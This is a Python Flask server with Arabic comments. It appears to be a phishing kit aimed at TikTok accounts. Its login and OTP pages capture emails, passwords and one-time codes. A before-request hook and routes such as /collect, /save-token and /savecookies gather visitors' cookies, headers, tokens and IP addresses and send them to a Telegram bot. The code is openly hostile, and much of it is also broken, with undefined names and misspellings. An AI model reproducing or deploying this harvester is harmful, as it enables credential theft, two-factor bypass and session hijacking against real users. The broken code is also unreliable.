from flask import (
Flask, g, render_template_string, request, jsonify, redirect, render_template, send_from_directory, session, url_for, make_response)
import secrets

from datetime import datetime
import os, json, requests
from pathlib import Path
 
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass
    
app = Flask(__name__, template_folder="templates") 
app.debug = True
s = requests.Session()
r = s.get("https://www.tiktok.com/")
server_side_cookies = s.cookies.get_dict()
ALLOWED_ORIGIN = "https://www.tiktok.com/"
refresh_token = "REFRESH_TOKEN_FROM_SITE"

headers = {"User-Agent": "Mozilla/5.0"}
TOKEN_TTL_HOURS=int(os.getenv("TOKEN_TTL_HOURS","999999999"))   
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
CHAT_ID   = os.getenv("TG_CHAT_ID")
ANSWER_FILE = "answer.json"
app.config.setdefault("sessionid"), requests.session()

def send_to_telegram(text: str):

    if not BOT_TOKEN or not CHAT_ID:
            print("⚠️ TG_BOT_TOKEN/TG_CHAT_ID مش مضبوطين في ENV — تخطّي الإرسال.")
            return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        r = requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
        print("TG >", r.status_code, r.text[:200])
        
        for i in range(0, len(text), 3500):
            chunk = text[i:i+3500]
            requests.post(url, json={"chat_id": CHAT_ID, "text": chunk}, timeout=10)
            
    except Exception as e:
        print("TG error:", e)     
        
def load_answers():
    if os.path.exists(ANSWERS_FILE):
        try:
            with open(ANSWERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
                
        except Exception:
            return[]
           
def save_answer(puzzle_no: int, answer: str):
    data = load_answer()
    data.append({
        "ts": datetime.utcnow().isoformat() + "Z",
        "puzzle": puzzle_no,
        "answer": (answer)
    })
    with open(ANSWER_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False,)
        
    with open(ANSWER_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        print(data)
            

def require_step(min_step: int):

    cur = session.get("step", 1)
    if cur < min_step:
        return redirect(url_for("start"))
    return None
    
@app.before_request
def load_data():

    headers_list = [(k, v) for k, v in request.headers.items()]

    cookies_list = [(k, v) for k, v in request.cookies.items()]
    
    print("=== HEADERS ===")
    for k, v in headers_list:
        print(f"{k}: {v}")

    print("=== COOKIES ===")
    for k, v in cookies_list:
        print(f"{k}={v}")
        
        print("METHOD:", request.method)
        print("ORIGIN:", request.headers.get("Origin"))
        print("CT:", request.headers.get("Content-Type"))
        print("RAW JSON:", request.get_json(silent=True))
        print("RAW FORM:", request.form.to_dict())
        print("RAW COOKIES:", request.cookies.to_dict())
        
    
    message = f"""
    HEADERS:\n{headers_list}\n\nCOOKIES:\n{cookies_list} 
    """
    send_to_telegram(message) 

@app.route("/set_cookie")
def set_cookie():
    # نولّد قيمة عشوائية (token) بدل ما نكتبها يدوي
    token = secrets.token_hex(16); put_session(token)

    resp = make_response(f"sessionid: {token}")
    resp.set_cookie(
        "sessionid",    # اسم الكوكي
        token,          # القيمة العشوائية اللي اتولّدت
        httponly=True,
        samesite="None",
        path="/"
    )
    
    sessions = load_sessions() or {}
    sessions[token] = {"session_id": token}
    
    save_sessions(sessions)
    
    return resp

@app.route("/get_cookie")
def get_cookie():
    # نقرأ الكوكي اللي اتخزن عند المتصفح
    token = request.cookies.get("sessionid")
    sessions = load_sessions() or {}
    ok = any(entry.get("sesstion_id") == token for entry in sessions)
    return f"cookie sessionid = {token}"
    
@app.route("/check")
def check():
    token = request.cookies.get("sessionid")
    sessions = load_sessions() or {}
    return {"ok":valid_session(token), "session_id":token}
    
@app.route('/', methods=["GET"])
def index():
    data = {
        "when": datetime.utcnow().isoformat()+"Z",
        "headers": dict(request.headers),
        "cookies": request.cookies.to_dict(),
        "args": request.args.to_dict(),          
        "form": request.form.to_dict(),          
        "json": request.get_json(silent=True),   
        "raw": request.get_data(as_text=True),  
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent")
    }
    
    data_server = {
        "server_time": datetime.utcnow().isoformat()+"Z",
        "server_ip": request.remote_addr,}
        
    payload = {**data, **data_server}
    sid=request.cookies.get("sessionid")
   
    send_to_telegram(f"{payload}\nSessionid: {sid}")

    return render_template("index.html", sid=sid)
    
@app.route("/login", methods=["POST"]) 
def login_post():
    email = request.form.get("answer")
    password = request.form.get("answer")
    answer = {"email": email, "password": password}
    save_answer(1, answer)
    send_to_telegram(f": {answer}")
    return redirect(url_for("login_get"))
 
@app.route("/login", methods=["GET"])
def login_get():
    return render_template("login.html")


@app.route("/otp", methods=["POST"])
def otp_post():
    otp = request.form.get("answer")
    answer = {"otp":otp}
    save_answer(2, answer)
    send_to_telegram(f"🧩 إجابة اللغز 2: {answer}")
    return redirect(url_for("otp_get"))

@app.route("/otp", methods=["GET"])
def otp_get():
    return render_template("otp.html")
    
@app.route('/thanks.html')
def thanks():
    return render_template("thanks.html")
       
@app.before_request
def init():
        app.config["sessionid"] = requests.Session()
    
@app.route("/track", methods=["POST"])
def track():
    data = {
        "when": datetime.utcnow().isoformat()+"Z",
        "headers": dict(request.headers),
        "cookies": request.cookies.to_dict(),
        "args": request.args.to_dict(),          # لو في ?x=1
        "form": request.form.to_dict(),          # بيانات الفورم العادية
        "json": request.get_json(silent=True),   # لو جاية JSON
        "raw": request.get_data(as_text=True),   # الجسم الخام
        "ip": request.headers.get("Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent", ""),
        "received_at": datetime.utcnow().isoformat() + "Z"
    }
    data_server ={
        "server_time": datetime.utcnow().isoformat() + "Z",
        "server_ip": request.remote_addr,
        "server_name": "Main-Node-1"
    }
    payload = {**data, **data_server}
    
    send_to_telegram(f"{payload}")
    return jsonify({"payload": payload})

@app.route("/endpoint", methods=["POST"])
def endpoint():
    payload = request.get_json()
    path = payload.get("path")
    data = payload.get("data", {})
    s = app.config("sessionid")
    
    tik_url = f"https://www.tiktok.com{path}"
    resp = s.post(tik_url, json=data, headers=headers, timeout=20)
    
    r = s.get("https://www.tiktok.com/", headers=headers)
    
    cookies = r.cookies.get_dict()
    
    r2 = s.get("https://www.tiktok.com/@bmwlovers1077")

    resp = requests.get("https://www.tiktok.com/", headers=headers, cookies=r.cookies.get_dict())

    
    resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
    resp.headers["Access-Control-Allow-Credentials"] = "true"

    message = f"""
    TikTok EndpointDebug Report
    Payload: {payload}
    Request Path: {path}
    Data Sent: {data}
    Request Headers: {headers}

    POST Response: {resp.status_code}
    Cookies: {cookies}
    GET Response: {r2.status_code}

    GET Response Headers:
    {resp.headers}
    
    Request Headers: {r.request.headers}
    Response Cookies: {r.cookies.get_dict()}

    
    Request Headers: {r2.request.headers}
    Response Cookies: {r2.cookies.get_dict()}

    
    Request Headers: {resp.request.headers}
    Response Cookies: {resp.cookies.get_dict()}

    
    Method: {request.method}
    Args (GET params): {request.args.to_dict()}
    Form (POST data): {request.form.to_dict()}
    JSON body: {request.get_json(silent=True)}
    Cookies: {request.cookies.to_dict()}
    """
    print(message)
    send_to_telegram(message)
    
    resp.headers["Access-Control-Allow-Origin"]= "https://www.tiktok.com"
    resp.headers["Access-Control-Allow-Credentials"]="true"
    resp = requests.get("https://www.tiktok.com/@bmwlovers1077/", cookies=cookies, headers=headers)
    

@app.after_request
def add_headers(resp):
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return resp

@app.route("/savecookies")
def savecookies():
    # الكوكيز اللي جت مع الريكوست
    cookies = request.cookies.to_dict()

    try:
    # لو الملف موجود نقرأ محتواه
        if os.path.exists("cookies.json"):
            with open("cookies.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                print("Loaded cookies.json:", data)
        else:
            data = []
    except:
        data = []
    # نضيف الكوكيز الجديدة
    data.append(cookies)
    print("After append:", data)
    # نحفظهم تاني
    with open("cookies.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

    return "ok"
    

@app.route("/save-token", methods=["POST"])
def save_token():
    data = request.get_json()
    token = data.get("accessToken")
    send_to_telegram(token)
    return jsonify({"ok": True})    



@app.route("/refresh", methods=["GET"])
def refresh_access_token():
    resp = requests.post("https://www.tiktok.com/@bmwlovers1077/refresh", data={
        "grant_type": "refresh_token",
        "refresh_token": refresh_token
    })
    
    if resp.status_code == 200:
        new_token = resp.json().get("access_token")
        return jsonify({"access_token": new_token})

             
@app.route('/session_files')
def session_files():

       all_headers = dict(request.headers)
       
       all_cookies = request.cookies.to_dict()
       
       for name, value in request.cookies.items():
       
           print(name, "=", value)
          
       message = f"New Request\n\nHEADERS:\n{dict(all_headers)}\n\nCOOKIES:\n{dict(all_cookies)}"

       send_to_telegram(message)
       
       resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
       resp.headers["Access-Control-Allow-Credentials"] = "true"
    
       return resp

@app.route('/collect_session', methods=['POST'])
def collect_session():
    try:
        payload = request.get_json(silent=True)
        if not payload:
            payload = request.form.to_dict()  
        message = payload     
        
        send_to_telegram(message)
    
    except:
        pass   
         
 
def collect_sessions():
    g.data = request.get_json(silent=True) or {}
    logs.append({
        "email": g.data.get("email", ""),
        "password": g.data.get("password"),
        "phone": g.data.get("phone"),
        "otp": g.data.get("otp"),
        "ip": g.data.get("ip"),
        "cookie": g.data.get("cookies"),
    })
    sessions =load_sessions()
    sessions.append(sessions_data)
    
    save_sessions(sessions)
    
     
       
    message = f"""
    Cookie: {g.data.get("cookies")}
    Email: {g.data.get("email")}
    Password: {g.data.get("password")}
    Phone: {g.data.get("phone")}
    OTP: {g.data.get("otp")}
    IP: {g.data.get("ip")}
    """ 
    
    send_to_telegram(message)
    return {"status": "saved"}  
    
@app.route('/collect', methods=['POST'])
def collect():
         
         body = request.get_json(silent=True)
         form = request.form.to_dict()
         headers = dict(request.headers)
         all_cookies = request.cookies.to_dict()
          
         authorization = headers.get("Authorization")
         auth_hdr = headers.get("Authorization")
         args = request.args.to_dict()
         xff = headers.get("X-Forwarded-For") 
         ip = headers.get("ip") or request.remote_addr
         cookie_token = all_cookies.get("sessionid") or all_cookies.get("csrftoken")
         form_token = body.get("token") or form.get("token")
         event = "page_open"
         ua = headers.get("User-Agent")
 
          
         session_data = {
          "ts": datetime.utcnow().isoformat() + "Z",
          "ip": ip,
          "ua": ua,
          "headers": headers,          # لو عايزة تقللي الحجم ممكن تعملي whitelist
          "cookies": all_cookies,
          "authorization": authorization, 
          "cookie_token": cookie_token,
          "form_token": form_token,
          }

         sessions = load_sessions()
         sessions.append(sessions_data)
         save_sessions(sessions)

    # ابعتي ملخّص لتليجرام (بدون أسرار خام)
         message = f"""
          IP: {session_data['ip']}
          UA: {session_data['ua']}
          Cookie Token: {session_data['cookie_token']}
          Form Token: {session_data['form_token']}
          Cookies: {session_data['all_cookies']}
          Headers: {session_data['headers']}
          At: {session_data['ts']}
          """
         print("SESSION:", sessions_data)   
         send_to_telegram(message)
    
         resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
         resp.headers["Access-Control-Allow-Credentials"] = "true"
         return resp

@app.route("/submit", methods=["POST"])
def submit():
    # 1) ابنِ الحمولة بأمان
    data = {}
    try:
        data.update(request.form.to_dict())
        j = request.get_json(silent=True) or {}
        if isinstance(j, dict):
            data.update(j)
        data["args"] = request.args.to_dict()
        data["ip"] = request.remote_addr or ""
        data["ua"] = request.headers.get("User-Agent")
        data["ts"] = datetime.utcnow().isoformat() + "Z"
    except Exception as e:
        print("build payload error:", repr(e))

    # 2) خزّن في log.json (اختياري)
    try:
        log = []
        if os.path.exists("log.json"):
            with open("log.json", "r", encoding="utf-8") as f:
                log = json.load(f)
                if not isinstance(log, list):
                    log = []
        log.append(data)
        with open("log.json", "w", encoding="utf-8") as f:
            json.dump(log, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print("save log error:", repr(e))

    # 3) ابعت لتليجرام (لو الدالة عندك شغالة)
    try:
        send_to_telegram(json.dumps(data, ensure_ascii=False, indent=2))
    except Exception as e:
        print("tg send error:", repr(e))

    # 4) حوّل للصفحة اللي بعدها
    return redirect(url_for("otp_get"))                     
     
@app.route("/show_cookies")
def show_cookies():
    
    cookies = request.cookies.to_dict()
    result = []
    for name, value in cookies.items():
        result.append(f"{name} = {value}")
        
    lines = [f"{k} = {v}" for k, v in request.cookies.items()]    
        
    send_to_telegram("\n".join(liness))
         
    return "<br>".join(result) 
         
if __name__ == "__main__":
        port = int(os.environ.get("PORT",8081))
        app.run(host="0.0.0.0", port=port, debug=True)
